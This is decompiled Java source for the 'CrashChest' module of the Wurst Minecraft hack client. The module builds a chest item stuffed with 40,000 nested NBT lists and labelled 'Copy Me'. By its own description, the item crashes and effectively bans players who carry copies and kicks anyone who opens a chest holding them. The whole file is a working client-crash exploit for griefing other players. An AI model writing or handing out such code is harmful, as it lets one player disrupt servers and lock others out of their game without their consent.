// 
// Decompiled by Procyon v0.6.0
// 

package net.wurstclient.features.mods.items;

import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.block.Block;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Blocks;
import net.wurstclient.utils.InventoryUtils;
import net.wurstclient.util.ChatUtils;
import net.wurstclient.Category;
import net.wurstclient.features.SearchTags;
import net.wurstclient.features.Hack;

@SearchTags({ "crash chest" })
public final class CrashChestMod extends Hack
{
    public CrashChestMod() {
        super("CrashChest", "Generates a chest that essentially bans people\nfrom the server if they have too many copies\nof it in their inventory. §c§lWARNING:§r §cThis cannot\n§cbe undone. Use with caution!§r\n\nIf copies are instead placed in a chest, anyone\nwho opens the chest will be kicked from the\nserver (just once).");
        this.setCategory(Category.ITEMS);
    }
    
    @Override
    public void onEnable() {
        if (!CrashChestMod.MC.player.abilities.creativeMode) {
            ChatUtils.error("Creative mode only.");
            this.setEnabled(false);
            return;
        }
        if (!InventoryUtils.isSlotEmpty(36)) {
            ChatUtils.error("Please clear your shoes slot.");
            this.setEnabled(false);
            return;
        }
        final ItemStack stack = new ItemStack(Blocks.CHEST);
        final NBTTagCompound nbtCompound = new NBTTagCompound();
        final NBTTagList nbtList = new NBTTagList();
        for (int i = 0; i < 40000; ++i) {
            nbtList.appendTag(new NBTTagList());
        }
        nbtCompound.setTag("www.wurstclient.net", nbtList);
        stack.setTagInfo("www.wurstclient.net", nbtCompound);
        stack.setStackDisplayName("Copy Me");
        InventoryUtils.placeStackInArmor(0, stack);
        ChatUtils.message("Item has been placed in your shoes slot.");
        this.setEnabled(false);
    }
}
